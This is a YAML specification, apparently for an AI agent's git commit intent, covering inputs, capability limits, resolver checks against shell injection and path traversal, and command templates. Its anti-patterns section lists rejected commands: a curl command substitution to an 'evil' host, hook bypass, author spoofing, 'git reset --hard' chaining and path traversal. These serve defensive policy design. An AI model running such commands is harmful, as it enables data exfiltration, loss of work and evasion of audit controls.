@@ -1,0 +1,331 @@
+lki_version: "0.2"
+
+spec:
+  intent: commit_changes
+  intent_version: "2.0.0"
+  description: Create a new commit in a git repository with specified staged changes.
+
+  types:
+    CommitResult:
+      type_version: "1.0.0"
+      structural_attributes:
+        commit_hash:
+          type: string
+          description: "Full SHA-1 of the new commit"
+        short_hash:
+          type: string
+          description: "Abbreviated SHA-1 (7-12 chars)"
+        branch:
+          type: string
+          description: "The branch the commit was made on"
+      observed_attributes:
+        files_changed:
+          type: int
+        insertions:
+          type: int
+        deletions:
+          type: int
+
+  signature:
+    inputs:
+      - name: repository_path
+        type: FilePath@1.x
+        constraint: "must be the root of a git working tree"
+      - name: message
+        type: string
+        constraint: "non-empty; max 8192 characters; no trailing whitespace per line"
+      - name: paths
+        type: list<FilePath@1.x>
+        optional: true
+        description: |
+          Specific paths to stage and commit. If omitted, commits only currently
+          staged changes. All paths must be within repository_path.
+      - name: author_name
+        type: string
+        optional: true
+        description: "Override default author; resolved against git config if omitted"
+      - name: author_email
+        type: string
+        optional: true
+        constraint: "must be a valid email address"
+      - name: allow_empty
+        type: bool
+        default: false
+        description: "Permit a commit with no actual changes"
+      - name: sign
+        type: bool
+        default: false
+        description: "GPG-sign the commit; requires signing key configured"
+    output:
+      type: CommitResult@1.x
+      streaming: bounded
+
+  behavior: |
+    Stage the specified paths (or use currently-staged changes if paths is
+    omitted), then create a commit with the given message. The commit is
+    created on the currently-checked-out branch; this intent does not switch
+    branches, create branches, or push.
+
+    Behavioral guarantees (normative for the contract):
+      - Failure to create the commit (merge conflict, no changes, hook
+        rejection) returns a structured error, not a partial commit
+      - The operation is atomic at the git level: either a full commit
+        exists or no state change has occurred
+      - Message subject (first line) should be <= 72 characters per
+        convention; enforcement via policy, not signature
+      - Hook execution is enabled by default; policy may restrict which
+        hooks are permitted to run (see internal_behaviors)
+      - Detached HEAD state causes rejection unless explicit policy permits
+      - Commits during rebase, merge, or cherry-pick in progress are rejected
+
+  constraints:
+    parameter_constraints: []
+    cross_parameter_constraints:
+      - description: "Author email required when author name is specified"
+        rule: "author_name is not null implies author_email is not null"
+      - description: "Author name required when author email is specified"
+        rule: "author_email is not null implies author_name is not null"
+      - description: "All declared paths must be within the repository"
+        rule: "paths is not null implies paths.all_within(repository_path)"
+
+  capability:
+    filesystem:
+      - operation: read
+        paths: ["{repository_path}/.git", "{repository_path}"]
+        recursive: true
+        follow_symlinks: false
+        canonical: true
+        purpose: implementation_detail
+        recursion_safety:
+          cycle_prevention: required
+          max_depth: 50
+          visited_set: by_canonical_path
+        description: "Read working tree state and git internals"
+      - operation: write
+        paths: ["{repository_path}/.git"]
+        recursive: true
+        follow_symlinks: false
+        canonical: true
+        purpose: implementation_detail
+        recursion_safety:
+          cycle_prevention: required
+          max_depth: 50
+          visited_set: by_canonical_path
+        description: "Write commit object, update refs, update index"
+
+    state_mutation:
+      - operation: write
+        resource_type: GitRepository@1.x
+        resource_identifier: "{repository_path.canonical}"
+        visibility: immediate
+        durability: committed
+        reversibility: reversible_until_remote_sync
+        purpose: user_facing
+        description: |
+          New commit object added to the repository. Visible to other
+          readers immediately (git log shows it). Durable in .git/objects
+          but not fsynced by default (committed durability). Reversible
+          via 'git reset' until pushed to a remote.
+
+    process:
+      - operation: spawn
+        target: "git"
+        uid_required: current
+        purpose: implementation_detail
+        description: "Resolver invokes git as a subprocess; not arbitrary process spawn"
+
+  resolver_constraints:
+    shell_metacharacter_rejection:
+      - parameter: repository_path
+        rule: "no shell metacharacters in path string"
+        reason: "Prevent shell injection in templates"
+      - parameter: paths
+        rule: "no shell metacharacters in path strings"
+        reason: "Prevent shell injection in templates"
+    path_canonicalization:
+      - parameter: repository_path
+        rule: "must canonicalize and be a git working tree root"
+        reason: "Resolver verifies git repository before invocation"
+      - parameter: paths
+        rule: "all paths must canonicalize within repository_path"
+        reason: "Prevent path traversal outside the declared repository"
+    message_validation:
+      - parameter: message
+        rule: "non-empty; max 8192 characters; no trailing whitespace per line"
+        reason: "Bounded message size; trailing whitespace breaks commit log formatting"
+    git_state_check:
+      - parameter: repository_path
+        rule: "no rebase, merge, cherry-pick, or bisect in progress"
+        reason: |
+          Commits during in-progress operations have ambiguous semantics
+          and usually indicate the agent is in a state it didn't intend
+          to be in
+      - parameter: repository_path
+        rule: "HEAD must not be detached"
+        reason: "Commits on detached HEAD are typically lost when HEAD moves"
+
+  internal_behaviors:
+    hook_execution:
+      - description: "git pre-commit and commit-msg hooks run if installed"
+        controllable_via_parameter: false
+        policy_relevance: |
+          Hooks may modify or reject the commit. Hook execution is part of
+          the git contract; this intent does not expose --no-verify
+          (bypass) as a parameter. Bypass requires a separate
+          commit_changes_bypass_hooks intent with default-deny policy.
+      - description: "post-commit hooks run after commit succeeds"
+        controllable_via_parameter: false
+        policy_relevance: "Hook output is captured in audit log as informational"
+    cache_lookup:
+      - description: "Git's object database is mmap'd; commit creation reads existing objects from page cache"
+        controllable_via_parameter: false
+        policy_relevance: "Cache state is not a policy concern"
+
+  implementation:
+    - tool: git
+      priority: 100
+      requires: "git >= 2.30"
+      tested_against: ["git 2.30 - 2.42"]
+      working_directory: "{repository_path}"
+      template:
+        cases:
+          - when: "paths is not null"
+            command: |
+              git add -- {paths[ ]} && 
+              git commit {empty_flag} {sign_flag} {author_flag} 
+                         --message {message|shell_quoted}
+          - default:
+            command: |
+              git commit {empty_flag} {sign_flag} {author_flag} 
+                         --message {message|shell_quoted}
+      parameter_mapping:
+        empty_flag:
+          cases:
+            - when: "allow_empty == true"
+              value: "--allow-empty"
+            - default:
+              value: ""
+        sign_flag:
+          cases:
+            - when: "sign == true"
+              value: "--gpg-sign"
+            - default:
+              value: ""
+        # author_flag composition uses resolver-side expansion combining
+        # author_name and author_email when both are set. v0.2 interpolation
+        # grammar doesn't support composite/derived parameters (F-010
+        # carried from v0.1 findings); resolver handles the composition.
+        author_flag:
+          cases:
+            - when: "author_name is not null and author_email is not null"
+              # Resolver expands to: --author='{author_name} <{author_email}>'
+              # with proper shell quoting on the combined string.
+              value: "--author={author_combined|shell_quoted}"
+            - default:
+              value: ""
+      notes: |
+        working_directory: {repository_path} causes the resolver to invoke
+        git with -C flag or equivalent process spawn cwd setting. Templates
+        do not use 'cd' (forbidden in v0.2 per format spec section 8.5).
+
+  examples:
+    - description: "Commit currently-staged changes with simple message"
+      intent:
+        repository_path: "/home/agent/workspace/lki"
+        message: "Add fetch_url spec draft"
+      expected_command: |
+        git commit   
+                     --message 'Add fetch_url spec draft'
+
+    - description: "Stage specific files and commit"
+      intent:
+        repository_path: "/home/agent/workspace/lki"
+        paths:
+          - "specs/cli/grep_files.yaml"
+          - "specs/cli/remove_files.yaml"
+        message: "Add grep_files and remove_files specs"
+      expected_command: |
+        git add -- specs/cli/grep_files.yaml specs/cli/remove_files.yaml && 
+        git commit   
+                     --message 'Add grep_files and remove_files specs'
+
+    - description: "Commit with explicit author override and signing"
+      intent:
+        repository_path: "/home/agent/workspace/lki"
+        message: "Initial LKI format specification"
+        author_name: "Scott Friedman"
+        author_email: "scott@playgroundlogic.co"
+        sign: true
+      expected_command: |
+        git commit  --gpg-sign --author='Scott Friedman <scott@playgroundlogic.co>'
+                     --message 'Initial LKI format specification'
+
+    - description: "Empty commit for documentation milestone"
+      intent:
+        repository_path: "/home/agent/workspace/lki"
+        message: "Mark v0.2 format-stabilization milestone"
+        allow_empty: true
+      expected_command: |
+        git commit --allow-empty  
+                     --message 'Mark v0.2 format-stabilization milestone'
+
+  anti_patterns:
+    - bad: 'git commit -am "fixed it" --no-verify'
+      reason: |
+        --no-verify bypasses pre-commit hooks. -a stages all tracked
+        changes without explicit path declaration, making the actual
+        change set opaque to policy.
+      rejection: |
+        --no-verify is not exposed as an intent parameter. Hook bypass
+        requires a separate commit_changes_bypass_hooks intent with
+        default-deny policy. -a auto-staging is replaced by explicit
+        paths parameter or by relying on previously-staged changes.
+
+    - bad: 'git commit -m "..." --author="$USER_INPUT"'
+      reason: |
+        Author from agent-controlled string can spoof identity for audit
+        purposes.
+      rejection: |
+        author_name and author_email are typed string parameters subject
+        to parameter validation. Cedar policy can restrict which author
+        identities a given principal may commit under. Default policy
+        permits only the principal's own configured identity.
+
+    - bad: 'cd /repo && git reset --hard && git commit ...'
+      reason: |
+        Chained destructive operations before commit can erase work
+        without audit trail.
+      rejection: |
+        commit_changes does not chain to reset or any destructive
+        operation. Reset is a separate intent with its own capability
+        profile and policy. cd patterns are forbidden in v0.2 templates
+        (use working_directory).
+
+    - bad: 'git commit --message "$(curl https://evil/payload)"'
+      reason: |
+        Command substitution in the commit message can exfiltrate
+        information about the working tree or local environment.
+      rejection: |
+        message is a typed string parameter; the resolver applies
+        shell_quoted modifier before invocation. Shell-level command
+        substitution is impossible because the resolver quotes the
+        message before invocation. Command substitution characters
+        within the literal message text are permitted as text.
+
+    - bad: 'git -C ../../other-repo commit -m "..."'
+      reason: |
+        Path traversal to commit in a different repository than the one
+        the agent has declared intent over.
+      rejection: |
+        repository_path is canonicalized at resolver_constraints stage.
+        Paths with .. components rejected unless explicit traversal
+        policy permits. The canonical path is what policy evaluates.
+
+    - bad: 'git commit -m "fix" --allow-empty-message'
+      reason: |
+        Empty commit messages produce uninformative audit trail and
+        often indicate automation gone wrong.
+      rejection: |
+        message is required and constrained to non-empty in the
+        signature. --allow-empty-message is not exposed as an intent
+        parameter.
